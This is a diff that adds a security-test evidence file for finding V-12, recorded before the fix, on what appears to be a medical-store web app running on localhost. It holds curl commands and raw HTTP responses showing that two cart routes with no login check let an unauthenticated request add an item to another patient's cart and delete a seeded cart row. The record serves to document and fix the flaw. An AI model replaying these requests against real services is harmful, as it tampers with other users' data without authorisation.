@@ -1,0 +1,78 @@
+V-12 Two of the three cart routes have no login check
+=====================================================
+
+state    : BEFORE the fix
+captured : 2026-09-24T17:36:50Z
+branch   : test/it22083500/v11-v15-before-evidence
+commit   : ec2853c
+tool     : curl 8.15.0  (real curl, output unedited)
+target   : http://localhost:4000  (disposable in-memory database, localhost only)
+
+Variables used below (values come from security-tests/.tokens.json):
+  DANA=patientToken=<dana's JWT>    DANA_ID=6ab55fac2afa3227fe052584
+  BOBBY=patientToken=<bobby's JWT>  BOBBY_ID=6ab55fac2afa3227fe052580
+  ALPHA=doctorToken=<Dr Alpha's JWT>  ALPHA_ID=6ab55fad2afa3227fe052588   (Dr Beta's id: 6ab55fad2afa3227fe05258b)
+  MED1=6ab55fad2afa3227fe05258e  MED2=6ab55fad2afa3227fe05258f  CART_ID=6ab55fad2afa3227fe052783  APPT_ID=6ab55fad2afa3227fe052785
+
+------------------------------------------------------------------------------
+CONTROL — the one guarded route, no cookie
+$ curl -s -i "$BASE/api/v1/medicines-cart/user-cart/$BOBBY_ID"
+HTTP/1.1 401 Unauthorized
+X-Powered-By: Express
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+Content-Length: 50
+ETag: W/"32-8k04CpvW9UKnbs/XQCIPQJyLM+s"
+Date: Thu, 24 Sep 2026 17:36:50 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"success":false,"message":"Unauthorized Access!"}
+
+ATTACK 1 — add an item to Bobby's cart, NO cookie
+$ curl -s -i -X POST "$BASE/api/v1/medicines-cart/add-to-cart" -H "Content-Type: application/json" -d "{\"userId\":\"$BOBBY_ID\",\"medicineId\":\"$MED2\",\"quantity\":5,\"totalPrice\":500,\"status\":\"Pending\"}"
+HTTP/1.1 201 Created
+X-Powered-By: Express
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+Content-Length: 320
+ETag: W/"140-qM5xsqdjq2P4WzUg6E47+f32VjM"
+Date: Thu, 24 Sep 2026 17:36:50 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"statusCode":201,"data":{"userId":"6ab55fac2afa3227fe052580","medicineId":"6ab55fad2afa3227fe05258f","quantity":5,"totalPrice":500,"status":"Pending","_id":"6ab55fb22afa3227fe052794","createdAt":"2026-09-24T17:36:50.626Z","updatedAt":"2026-09-24T17:36:50.626Z","__v":0},"message":"Medicine Added to Cart Successfully!"}
+
+ATTACK 2 — delete Bobby's seeded cart row, NO cookie
+$ curl -s -i -X DELETE "$BASE/api/v1/medicines-cart/delete-from-cart/$CART_ID"
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+Content-Length: 81
+ETag: W/"51-UxdFsDt0gu3GgiWDpjaKe+v2fu8"
+Date: Thu, 24 Sep 2026 17:36:50 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"statusCode":200,"data":{},"message":"Medicine Deleted from Cart Successfully!"}
+
+CONFIRM — Bobby logs in and looks at his own cart
+$ curl -s -i "$BASE/api/v1/medicines-cart/user-cart/$BOBBY_ID" -H "Cookie: $BOBBY"
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+Content-Length: 312
+ETag: W/"138-g9Y7BNTJnP2KiTDSVYw1syiIWMU"
+Date: Thu, 24 Sep 2026 17:36:50 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"statusCode":200,"data":[{"_id":"6ab55fb22afa3227fe052794","userId":"6ab55fac2afa3227fe052580","medicineId":"6ab55fad2afa3227fe05258f","quantity":5,"totalPrice":500,"status":"Pending","createdAt":"2026-09-24T17:36:50.626Z","updatedAt":"2026-09-24T17:36:50.626Z","__v":0}],"message":"Cart Fetched Successfully!"}
+
+Seeded row 6ab55fad2afa3227fe052783 is gone, and the row for 6ab55fad2afa3227fe05258f was planted — both with no login.
